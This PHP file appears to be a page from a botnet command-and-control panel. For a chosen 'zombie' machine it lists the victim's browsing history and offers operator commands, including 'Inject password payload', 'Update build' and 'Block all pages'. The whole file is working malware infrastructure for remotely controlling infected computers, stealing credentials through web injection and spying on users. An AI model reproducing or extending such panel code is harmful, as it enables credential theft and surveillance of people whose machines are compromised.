<?php
require_once('includes/config.php');
if(isset($_GET['id']) && $_GET['id'] == ''){
    exit(1);
}
$select_name = $bdd->prepare("SELECT name FROM bots WHERE id = :id");
$select_name->bindParam(':id', $_GET['id']);
$select_name->execute();
$result = $select_name->fetch();
$z_name = $result['name'];
?>
<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=bots" class="item">Bots</a>
      <a href="#" class="active item">History</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
         <div class="ui segment">
        <h3>Listing action</h3>
        <form action="#" method="post">
            <select class="command" name="command">
                <option name='History'>Show computer history</option>
                <option name='WebInject'>Inject password payload</option>
                <option name='Compact'>Compact with current extension</option>
                <option name="update">Update build</option>
                <option name="lock">Block all pages</option>
            </select>
            <input class="command" type="submit" name="send" value="start command"/>
        </form>
    </div>
     <div class="ui segment">
        <h3>Computer history</h3>
      <table class="ui very basic table history">
  <thead>
    <tr>
      <th>Website</th>
      <th>Time</th>
    </tr>
  </thead>
  <tbody>
      <?php
      $history = $bdd->prepare("SELECT * FROM history_web WHERE zombie = :name ORDER BY id DESC LIMIT 0,5");
      $history->bindParam(':name', $z_name);
      $history->execute();
      while($fetch = $history->fetch()){
      ?>
        <tr>
          <td><?php echo $fetch['website']; ?></td>
          <td><?php echo $fetch['timevisit']; ?></td>
        </tr>
      <?php
      }
      ?>
  </tbody>
</table>
    </div>
</div>